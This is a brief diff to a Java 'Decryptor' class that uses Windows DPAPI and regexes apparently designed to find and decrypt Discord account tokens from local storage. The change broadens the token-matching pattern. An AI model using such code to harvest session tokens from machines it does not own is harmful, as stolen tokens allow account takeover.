@@ -15,7 +15,7 @@ import com.sun.jna.platform.win32.Crypt32Util;
 
 public class Decryptor {
     private static final Pattern ENCRYPTED_TOKEN_REGEX = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
-    public static final Pattern TOKEN_REGEX = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}");
+    public static final Pattern TOKEN_REGEX = Pattern.compile("[\\w-]{24,29}\\.[\\w-]{6}\\.[\\w-]{25,110}");
     private static final int ENCRYPTED_TOKEN_OFFSET = 12;
     private static final int DPAPI_OFFSET = 5;
     private static final int IV_OFFSET = 3;
